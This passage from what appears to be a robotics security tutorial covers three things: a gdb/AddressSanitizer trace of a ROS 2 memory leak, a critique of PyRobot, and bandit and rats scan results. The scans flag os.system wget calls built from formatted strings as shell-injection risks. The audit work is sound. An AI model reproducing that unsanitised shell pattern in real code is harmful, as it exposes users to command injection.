    0x00007ffff643611f rmw_names_and_types_fini+111 movl   $0xf1f1f1f1,0x7fff8000(%r13)
    0x00007ffff643612a rmw_names_and_types_fini+122 movl   $0xf2f2f2f2,0x7fff8084(%r13)
    0x00007ffff6436135 rmw_names_and_types_fini+133 movl   $0xf3f3f3f3,0x7fff8108(%r13)
    0x00007ffff6436140 rmw_names_and_types_fini+144 mov    %fs:0x28,%rax
    0x00007ffff6436149 rmw_names_and_types_fini+153 mov    %rax,-0x28(%rbp)
    0x00007ffff643614d rmw_names_and_types_fini+157 xor    %eax,%eax
    0x00007ffff643614f rmw_names_and_types_fini+159 cmpq   $0x0,-0x8b8(%rbp)
    ─── Expressions ───────────────────────────────────────────────────────────────────────────────────
    ─── History ───────────────────────────────────────────────────────────────────────────────────────
    ─── Memory ────────────────────────────────────────────────────────────────────────────────────────
    ─── Registers ─────────────────────────────────────────────────────────────────────────────────────
       rax 0x00007ffff64360b0           rbx 0x00007fffffff0af0           rcx 0x0000000000000000
       rdx 0x0000000000000000           rsi 0x0000000000000000           rdi 0x00007fffffff1e40
       rbp 0x00007fffffff1390           rsp 0x00007fffffff0ad0            r8 0x00007fffffff1400
        r9 0x0000000000000000           r10 0x0000000000000024           r11 0x00007ffff64360b0
       r12 0x00007fffffff1370           r13 0x00000fffffffe15e           r14 0x00007fffffff0af0
       r15 0x0000000000000000           rip 0x00007ffff6436140        eflags [ IF ]
        cs 0x00000033                    ss 0x0000002b                    ds 0x00000000
        es 0x00000000                    fs 0x00000000                    gs 0x00000000
    ─── Source ────────────────────────────────────────────────────────────────────────────────────────
    81   return RMW_RET_OK;
    82 }
    83
    84 rmw_ret_t
    85 rmw_names_and_types_fini(rmw_names_and_types_t * names_and_types)
    86 {
    87   if (!names_and_types) {
    88     RMW_SET_ERROR_MSG(&quot;names_and_types is null&quot;);
    89     return RMW_RET_INVALID_ARGUMENT;
    90   }
    91   if (names_and_types-&gt;names.size &amp;&amp; !names_and_types-&gt;types) {
    ─── Stack ─────────────────────────────────────────────────────────────────────────────────────────
    [0] from 0x00007ffff6436140 in rmw_names_and_types_fini+144 at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:86
    arg names_and_types = 0x7fffffff1e40
    [1] from 0x00007ffff6bb8756 in rcl_names_and_types_fini+62 at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:213
    arg topic_names_and_types = 0x7fffffff1e40
    [+]
    ─── Threads ───────────────────────────────────────────────────────────────────────────────────────
    [10] id 1335 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [9] id 1334 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [8] id 1333 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [7] id 1319 name test_graph__rmw from 0x00007ffff577dbb7 in epoll_wait+87 at ../sysdeps/unix/sysv/linux/epoll_wait.c:30
    [6] id 1318 name test_graph__rmw from 0x00007ffff5ffb9f3 in futex_wait_cancelable+27 at ../sysdeps/unix/sysv/linux/futex-internal.h:88
    [5] id 1315 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [4] id 1314 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [3] id 1313 name test_graph__rmw from 0x00007ffff6000567 in __libc_recvmsg+71 at ../sysdeps/unix/sysv/linux/recvmsg.c:28
    [2] id 1312 name test_graph__rmw from 0x00007ffff577dbb7 in epoll_wait+87 at ../sysdeps/unix/sysv/linux/epoll_wait.c:30
    [1] id 1308 name test_graph__rmw from 0x00007ffff6436140 in rmw_names_and_types_fini+144 at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:86
    ───────────────────────────────────────────────────────────────────────────────────────────────────

    Thread 1 &quot;test_graph__rmw&quot; hit Breakpoint 4, rmw_names_and_types_fini (names_and_types=0x7fffffff1e40) at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:86
    86  {
    bt
    #0  rmw_names_and_types_fini (names_and_types=0x7fffffff1e40) at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:86
    #1  0x00007ffff6bb8756 in rcl_names_and_types_fini (topic_names_and_types=0x7fffffff1e40) at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:213
    #2  0x0000555555588de1 in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_and_destroy_topic_names_and_types_Test::TestBody (this=0x606000001ca0) at /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:174
    #3  0x0000555555649216 in testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt; (object=0x606000001ca0, method=&amp;virtual testing::Test::TestBody(), location=0x555555676dc0 &quot;the test body&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
    #4  0x000055555563b36a in testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt; (object=0x606000001ca0, method=&amp;virtual testing::Test::TestBody(), location=0x555555676dc0 &quot;the test body&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
    #5  0x00005555555e7e52 in testing::Test::Run (this=0x606000001ca0) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
    #6  0x00005555555e927d in testing::TestInfo::Run (this=0x612000000040) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
    #7  0x00005555555e9e21 in testing::TestCase::Run (this=0x611000000400) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
    #8  0x0000555555604f32 in testing::internal::UnitTestImpl::RunAllTests (this=0x615000000800) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
    #9  0x000055555564bcc9 in testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt; (object=0x615000000800, method=(bool (testing::internal::UnitTestImpl::*)(testing::internal::UnitTestImpl * const)) 0x555555604842 &lt;testing::internal::UnitTestImpl::RunAllTests()&gt;, location=0x55555567ae60 &quot;auxiliary test code (environments or event listeners)&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
    #10 0x000055555563d633 in testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt; (object=0x615000000800, method=(bool (testing::internal::UnitTestImpl::*)(testing::internal::UnitTestImpl * const)) 0x555555604842 &lt;testing::internal::UnitTestImpl::RunAllTests()&gt;, location=0x55555567ae60 &quot;auxiliary test code (environments or event listeners)&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
    #11 0x0000555555601cc6 in testing::UnitTest::Run (this=0x5555558bea80 &lt;testing::UnitTest::GetInstance()::instance&gt;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
    #12 0x00005555555d5215 in RUN_ALL_TESTS () at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
    #13 0x00005555555d515b in main (argc=1, argv=0x7fffffff4b28) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
    ```</code></pre>
    </details>
    <p>Note that this comes from <a href="https://github.com/ros2/rcl/blob/master/rcl/test/rcl/test_graph.cpp#L172">rcl/test/rcl/test_graph.cpp#L172</a>. Inspecting the code that creates the leak below, we observe that there’s simply no call to such <code>rcl_names_and_types_fini</code> function.</p>
    <p>Fix for the bug is available at https://github.com/vmayoral/rcl/commit/ec0e62cd04453f7968fa47f580289d3d06734a1d. Sent it upstream https://github.com/ros2/rcl/pull/468.</p>
    <h3 id="resources-4">Resources</h3>
    <ul>
    <li>[1] <a href="../tutorial1/">Tutorial 1: Robot sanitizers in ROS 2 Dashing</a></li>
    <li>[2] https://github.com/google/sanitizers/wiki/AddressSanitizerAndDebugger</li>
    <li>[3] https://github.com/google/sanitizers/wiki/AddressSanitizerLeakSanitizerVsHeapChecker</li>
    <li>[4] https://www.ibm.com/developerworks/community/blogs/IMSupport/entry/LINUX_GDB_IDENTIFY_MEMORY_LEAKS?lang=en</li>
    <li>[5] https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf</li>
    </ul>
    <h2 id="robot-sanitizers-with-gazebo">Robot sanitizers with Gazebo</h2>
    <p>Let’s start by compiling the moveit2 workspace by hand using ASan flags:</p>
    <div class="sourceCode" id="cb99"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb99-1"><a href="#cb99-1" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> build <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="at">--cmake-args</span> <span class="at">-DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS</span><span class="op">=</span>ON  <span class="at">-DINSTALL_EXAMPLES</span><span class="op">=</span>OFF <span class="at">-DSECURITY</span><span class="op">=</span>ON <span class="at">--no-warn-unused-cli</span> <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug <span class="at">--mixin</span> asan-gcc <span class="at">--merge-install</span></span></code></pre></div>
    <h3 id="resources-5">Resources</h3>
    <ul>
    <li>[1] https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf</li>
    </ul>
    <h2 id="static-analysis-of-pyrobot">Static analysis of PyRobot</h2>
    <h3 id="discussing-pyrobot">Discussing PyRobot</h3>
    <p>This section briefly discusses <code>pyrobot</code> and provides a biased opinion on how valid the contribution is for the AI and robotic communities.</p>
    <h4 id="the-rationale-behind-pyrobot">The rationale behind PyRobot</h4>
    <p>PyRobot has been developed and published by Facebook Artificial Intelligence research group. From the Facebook announcement:</p>
    <blockquote>
    <p>PyRobot is a framework and ecosystem that enables AI researchers and students to get up and running with a robot in just a few hours, without specialized knowledge of the hardware or of details such as device drivers, control, and planning. PyRobot will help Facebook AI advance our long-term robotics research, which aims to develop embodied AI systems that can learn efficiently by interacting with the physical world. We are now open-sourcing PyRobot to help others in the AI and robotics community as well.</p>
    </blockquote>
    <p>From this text one could say that the original authors not only aim to apply AI techniques to robots but specifically, come from an AI background and found the overall ROS ecosystem “too complex” (from my experience this is often the case of many software engineers diving into robotics). AI engineers often tend to disregard the complexity of robots and attempt find shortcuts that leave aside relevant technical aspects:</p>
    <blockquote>
    <p>PyRobot abstracts away details about low-level controllers and interprocess communication, so machine learning (ML) experts and others can simply focus on building high-level AI robotics applications.</p>
    </blockquote>
    <p>There’s still a strong discussion in the robotics community on whether AI techniques do actually outperform formal methods (traditional control mechanisms). This might indeed be the case on vision-powered applications but applying machine learning techniques end-to-end might not deliver the most optimal results as already reported in several articles.</p>
    <p>Robotics is the art of system integration and requires roboticists to care strongly about things such as determinism, real-time, security or safety. These aspects aren’t often the first priority for most AI engineers (changing policies is typically what most would expect). This is a recurrent situation that’s happening over and over with engineers jumping from AI-related areas to robotics. The desire of AI-oriented groups to apply “only AI” in robotics justifies the creation of yet new robotic frameworks <em>reinventing the wheel</em> unnecessarily. This happens every now and then. Most of these tools fail to grasp the technical aspects of robots and fail to provide means for complying with critical aspects in robotics.</p>
    <h4 id="diving-into-pyrobots-architecture">Diving into PyRobot’s architecture</h4>
    <p>According to its official paper [2], PyRobot is an open-source robotics framework for research and benchmarking. More specifically, PyRobot is defined as a <em>light-weight, high-level interface</em> <strong>on top of ROS</strong> <em>that provides a consistent set of hardware independent midlevel APIs to control different robots</em>.</p>
    <p>(<em>this sounds surprisingly close to ROS 1 original goals in a way, years after though</em>)</p>
    <p><img src="pyrobot.png" /></p>
    <p>According to its authors, the main problems that this framework solves are:</p>
    <blockquote>
    <p><strong>ROS requires expertise</strong>: Dominant robotic software packages like ROS and MoveIt! are complex and require a substantial breadth of knowledge to understand the full stack of planners, kinematics libraries and low-level controllers. On the other hand, most new users do not have the necessary expertise or time to acquire a thorough understanding of the software stack. A light weight, high-level interface would ease the learning curve for AI practitioners, students and hobbyists interested in getting started in robotics.</p>
    </blockquote>
    <p>This has historically been one of the main criticisims about ROS. ROS indeed has a learning curve however, there’re good reasons behind the complexity and layered architecture of the framework. Building a robotic application is a complicated task and reusing software requires a modular architecture. ROS was originally designed with an academic purpose and later on extended for its deployment in the PR2.</p>
    <p>Over the last few years ROS has transitioned from a research-oriented tool to an industrial-grade set of tools that power nowdays most complicated robotic behaviors. The result of this growth is clear when looking at ROS 2 which has been thought for industry-related use cases and with active discussions around security, safety or real-time.</p>
    <blockquote>
    <p><strong>Lack of hardware-independent APIs</strong>: Writing hardware-independant software is extremely challenging. In the ROS ecosystem, this was partly handled by encapsulating hardware-specific details in the Universal Robot Description Format (URDF) which other downstream services</p>
    </blockquote>
    <p>I’d argue against this. In fact, ROS is well known for its hardware abstraction layer that allows dozens of sensors and/or actuators to interoperate. Motion planning, manipulation and navigation stacks in the ROS world (namely the nav stack or moveit) have been built in a hardware agnostic manner and provide means of extension.</p>
    <p>The most striking fact about PyRobot is that it seems to ommit that ROS provides upper layers of abstraction (what would match as High-Level in the ROS section of the graph above) that capture complete robots. ROS-I official repos[4] group a number of such.</p>
    <hr />
    <p>While the aim of PyRobot seems to be clearly centered around <em>“accelerating AI robotics research”</em>, a somewhat simple way to compare PyRobot to existing de facto standards frameworks in robotics (such as ROS abstractions for a variety of robots) is to analyze the quality of the code generated. Quality Assurance (QA) methods are common in robotics and there’re several open source and community projects pushing towards the enhancement of open tools in the ROS community.</p>
    <p>There’s a variety of ways to review the quality of code. One simple manner is to perform a static analysis of the overall framework code and assess potential security flaws. The next section looks into this.</p>
    <p>## Performing a static analysis in the code</p>
    <p>Let’s quickly</p>
    <h4 id="results-of-bandit">Results of <code>bandit</code></h4>
    <div class="sourceCode" id="cb100"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb100-1"><a href="#cb100-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bandit</span> <span class="at">-r</span> .</span>
    <span id="cb100-2"><a href="#cb100-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    profile include tests: None</span>
    <span id="cb100-3"><a href="#cb100-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    profile exclude tests: None</span>
    <span id="cb100-4"><a href="#cb100-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    cli include tests: None</span>
    <span id="cb100-5"><a href="#cb100-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    cli exclude tests: None</span>
    <span id="cb100-6"><a href="#cb100-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    running on Python 3.7.3</span>
    <span id="cb100-7"><a href="#cb100-7" aria-hidden="true" tabindex="-1"></a><span class="ex">116</span> [0.. 50.. 100.. ]</span>
    <span id="cb100-8"><a href="#cb100-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Run</span> started:2019-06-24 21:09:09.231683</span>
    <span id="cb100-9"><a href="#cb100-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-10"><a href="#cb100-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Test</span> results:</span>
    <span id="cb100-11"><a href="#cb100-11" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;</span> Issue: <span class="ex">[B403:blacklist]</span> Consider possible security implications associated with pickle module.</span>
    <span id="cb100-12"><a href="#cb100-12" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Severity:</span> Low   Confidence: High</span>
    <span id="cb100-13"><a href="#cb100-13" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Location:</span> ./examples/crash_detection/crash_utils/train.py:10</span>
    <span id="cb100-14"><a href="#cb100-14" aria-hidden="true" tabindex="-1"></a>   <span class="ex">More</span> Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle</span>
    <span id="cb100-15"><a href="#cb100-15" aria-hidden="true" tabindex="-1"></a><span class="ex">9</span>   import os</span>
    <span id="cb100-16"><a href="#cb100-16" aria-hidden="true" tabindex="-1"></a><span class="ex">10</span>  import pickle</span>
    <span id="cb100-17"><a href="#cb100-17" aria-hidden="true" tabindex="-1"></a><span class="ex">11</span>  import time</span>
    <span id="cb100-18"><a href="#cb100-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-19"><a href="#cb100-19" aria-hidden="true" tabindex="-1"></a><span class="ex">--------------------------------------------------</span></span>
    <span id="cb100-20"><a href="#cb100-20" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;</span> Issue: <span class="ex">[B605:start_process_with_a_shell]</span> Starting a process with a shell, possible injection detected, security issue.</span>
    <span id="cb100-21"><a href="#cb100-21" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Severity:</span> High   Confidence: High</span>
    <span id="cb100-22"><a href="#cb100-22" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Location:</span> ./examples/crash_detection/locobot_kobuki.py:57</span>
    <span id="cb100-23"><a href="#cb100-23" aria-hidden="true" tabindex="-1"></a>   <span class="ex">More</span> Info: https://bandit.readthedocs.io/en/latest/plugins/b605_start_process_with_a_shell.html</span>
    <span id="cb100-24"><a href="#cb100-24" aria-hidden="true" tabindex="-1"></a><span class="ex">56</span>          print<span class="er">(</span><span class="st">&#39;CRASH MODEL NOT FOUND! DOWNLOADING IT!&#39;</span><span class="kw">)</span></span>
    <span id="cb100-25"><a href="#cb100-25" aria-hidden="true" tabindex="-1"></a><span class="ex">57</span>          os.system<span class="er">(</span><span class="st">&#39;wget {} -O {}&#39;</span><span class="ex">.format</span><span class="er">(</span><span class="ex">url,</span> model_path<span class="kw">))</span></span>
    <span id="cb100-26"><a href="#cb100-26" aria-hidden="true" tabindex="-1"></a><span class="ex">58</span></span>
    <span id="cb100-27"><a href="#cb100-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-28"><a href="#cb100-28" aria-hidden="true" tabindex="-1"></a><span class="ex">--------------------------------------------------</span></span>
    <span id="cb100-29"><a href="#cb100-29" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;</span> Issue: <span class="ex">[B605:start_process_with_a_shell]</span> Starting a process with a shell, possible injection detected, security issue.</span>
    <span id="cb100-30"><a href="#cb100-30" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Severity:</span> High   Confidence: High</span>
    <span id="cb100-31"><a href="#cb100-31" aria-hidden="true" tabindex="-1"></a>   <span class="ex">Location:</span> ./examples/grasping/grasp_samplers/grasp_model.py:46</span>
    <span id="cb100-32"><a href="#cb100-32" aria-hidden="true" tabindex="-1"></a>   <span class="ex">More</span> Info: https://bandit.readthedocs.io/en/latest/plugins/b605_start_process_with_a_shell.html</span>
    <span id="cb100-33"><a href="#cb100-33" aria-hidden="true" tabindex="-1"></a><span class="ex">45</span>          print<span class="er">(</span><span class="st">&#39;GRASP MODEL NOT FOUND! DOWNLOADING IT!&#39;</span><span class="kw">)</span></span>
    <span id="cb100-34"><a href="#cb100-34" aria-hidden="true" tabindex="-1"></a><span class="ex">46</span>          os.system<span class="er">(</span><span class="st">&#39;wget {} -O {}&#39;</span><span class="ex">.format</span><span class="er">(</span><span class="ex">url,</span> model_path<span class="kw">))</span></span>
    <span id="cb100-35"><a href="#cb100-35" aria-hidden="true" tabindex="-1"></a><span class="ex">47</span></span>
    <span id="cb100-36"><a href="#cb100-36" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-37"><a href="#cb100-37" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb100-38"><a href="#cb100-38" aria-hidden="true" tabindex="-1"></a><span class="ex">--------------------------------------------------</span></span>
    <span id="cb100-39"><a href="#cb100-39" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-40"><a href="#cb100-40" aria-hidden="true" tabindex="-1"></a><span class="ex">Code</span> scanned:</span>
    <span id="cb100-41"><a href="#cb100-41" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> lines of code: 10588</span>
    <span id="cb100-42"><a href="#cb100-42" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> lines skipped <span class="er">(</span><span class="co">#nosec): 0</span></span>
    <span id="cb100-43"><a href="#cb100-43" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb100-44"><a href="#cb100-44" aria-hidden="true" tabindex="-1"></a><span class="ex">Run</span> metrics:</span>
    <span id="cb100-45"><a href="#cb100-45" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> issues <span class="er">(</span><span class="ex">by</span> severity<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb100-46"><a href="#cb100-46" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Undefined:</span> 0.0</span>
    <span id="cb100-47"><a href="#cb100-47" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Low:</span> 105.0</span>
    <span id="cb100-48"><a href="#cb100-48" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Medium:</span> 6.0</span>
    <span id="cb100-49"><a href="#cb100-49" aria-hidden="true" tabindex="-1"></a>        <span class="ex">High:</span> 2.0</span>
    <span id="cb100-50"><a href="#cb100-50" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> issues <span class="er">(</span><span class="ex">by</span> confidence<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb100-51"><a href="#cb100-51" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Undefined:</span> 0.0</span>
    <span id="cb100-52"><a href="#cb100-52" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Low:</span> 0.0</span>
    <span id="cb100-53"><a href="#cb100-53" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Medium:</span> 0.0</span>
    <span id="cb100-54"><a href="#cb100-54" aria-hidden="true" tabindex="-1"></a>        <span class="ex">High:</span> 113.0</span>
    <span id="cb100-55"><a href="#cb100-55" aria-hidden="true" tabindex="-1"></a><span class="ex">Files</span> skipped <span class="er">(</span><span class="ex">1</span><span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb100-56"><a href="#cb100-56" aria-hidden="true" tabindex="-1"></a>    <span class="ex">./examples/sim2real/test.py</span> <span class="er">(</span><span class="ex">syntax</span> error while parsing AST from file<span class="kw">)</span></span></code></pre></div>
    <p>8 relevant security issues with either Medium or High severity. This differs strongly from ROS python layers with approximately the same LOC. E.g. rclpy in ROS 2:</p>
    <div class="sourceCode" id="cb101"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb101-1"><a href="#cb101-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bandit</span> <span class="at">-r</span> ros2/rclpy/</span>
    <span id="cb101-2"><a href="#cb101-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    profile include tests: None</span>
    <span id="cb101-3"><a href="#cb101-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    profile exclude tests: None</span>
    <span id="cb101-4"><a href="#cb101-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    cli include tests: None</span>
    <span id="cb101-5"><a href="#cb101-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    cli exclude tests: None</span>
    <span id="cb101-6"><a href="#cb101-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[main]</span>  INFO    running on Python 3.7.3</span>
    <span id="cb101-7"><a href="#cb101-7" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb101-8"><a href="#cb101-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Code</span> scanned:</span>
    <span id="cb101-9"><a href="#cb101-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> lines of code: 10516</span>
    <span id="cb101-10"><a href="#cb101-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> lines skipped <span class="er">(</span><span class="co">#nosec): 0</span></span>
    <span id="cb101-11"><a href="#cb101-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb101-12"><a href="#cb101-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Run</span> metrics:</span>
    <span id="cb101-13"><a href="#cb101-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> issues <span class="er">(</span><span class="ex">by</span> severity<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb101-14"><a href="#cb101-14" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Undefined:</span> 0.0</span>
    <span id="cb101-15"><a href="#cb101-15" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Low:</span> 256.0</span>
    <span id="cb101-16"><a href="#cb101-16" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Medium:</span> 0.0</span>
    <span id="cb101-17"><a href="#cb101-17" aria-hidden="true" tabindex="-1"></a>        <span class="ex">High:</span> 0.0</span>
    <span id="cb101-18"><a href="#cb101-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Total</span> issues <span class="er">(</span><span class="ex">by</span> confidence<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb101-19"><a href="#cb101-19" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Undefined:</span> 0.0</span>
    <span id="cb101-20"><a href="#cb101-20" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Low:</span> 0.0</span>
    <span id="cb101-21"><a href="#cb101-21" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Medium:</span> 0.0</span>
    <span id="cb101-22"><a href="#cb101-22" aria-hidden="true" tabindex="-1"></a>        <span class="ex">High:</span> 256.0</span>
    <span id="cb101-23"><a href="#cb101-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Files</span> skipped <span class="er">(</span><span class="ex">0</span><span class="kw">)</span><span class="bu">:</span></span></code></pre></div>
    <p><em>Complete dump at https://gist.github.com/vmayoral/de2a2792e043b4c40b0380daff8a9760</em></p>
    <p>The two test results above display two potential points of code injection in the code.</p>
    <h4 id="results-of-rats">Results of <code>rats</code></h4>
    <div class="sourceCode" id="cb102"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb102-1"><a href="#cb102-1" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb102-2"><a href="#cb102-2" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/grasping/grasp_samplers/grasp_model.py:46:</span> High: system</span>
    <span id="cb102-3"><a href="#cb102-3" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/crash_detection/locobot_kobuki.py:57:</span> High: system</span>
    <span id="cb102-4"><a href="#cb102-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Argument</span> 1 to this function call should be checked to ensure that it does not</span>
    <span id="cb102-5"><a href="#cb102-5" aria-hidden="true" tabindex="-1"></a><span class="ex">come</span> from an untrusted source without first verifying that it contains nothing</span>
    <span id="cb102-6"><a href="#cb102-6" aria-hidden="true" tabindex="-1"></a><span class="ex">dangerous.</span></span>
    <span id="cb102-7"><a href="#cb102-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb102-8"><a href="#cb102-8" aria-hidden="true" tabindex="-1"></a><span class="ex">./robots/LoCoBot/locobot_navigation/orb_slam2_ros/src/gen_cfg_file.cc:86:</span> High: system</span>
    <span id="cb102-9"><a href="#cb102-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Argument</span> 1 to this function call should be checked to ensure that it does not</span>
    <span id="cb102-10"><a href="#cb102-10" aria-hidden="true" tabindex="-1"></a><span class="ex">come</span> from an untrusted source without first verifying that it contains nothing</span>
    <span id="cb102-11"><a href="#cb102-11" aria-hidden="true" tabindex="-1"></a><span class="ex">dangerous.</span></span>
    <span id="cb102-12"><a href="#cb102-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb102-13"><a href="#cb102-13" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/pushing.py:24:</span> Medium: signal</span>
    <span id="cb102-14"><a href="#cb102-14" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/realtime_point_cloud.py:21:</span> Medium: signal</span>
    <span id="cb102-15"><a href="#cb102-15" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/navigation/vis_3d_map.py:21:</span> Medium: signal</span>
    <span id="cb102-16"><a href="#cb102-16" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/sawyer/joint_torque_control.py:23:</span> Medium: signal</span>
    <span id="cb102-17"><a href="#cb102-17" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/sawyer/joint_velocity_control.py:23:</span> Medium: signal</span>
    <span id="cb102-18"><a href="#cb102-18" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/grasping/locobot.py:314:</span> Medium: signal</span>
    <span id="cb102-19"><a href="#cb102-19" aria-hidden="true" tabindex="-1"></a><span class="ex">./robots/LoCoBot/locobot_calibration/scripts/collect_calibration_data.py:58:</span> Medium: signal</span>
    <span id="cb102-20"><a href="#cb102-20" aria-hidden="true" tabindex="-1"></a><span class="ex">./robots/LoCoBot/locobot_control/nodes/robot_teleop_server.py:17:</span> Medium: signal</span>
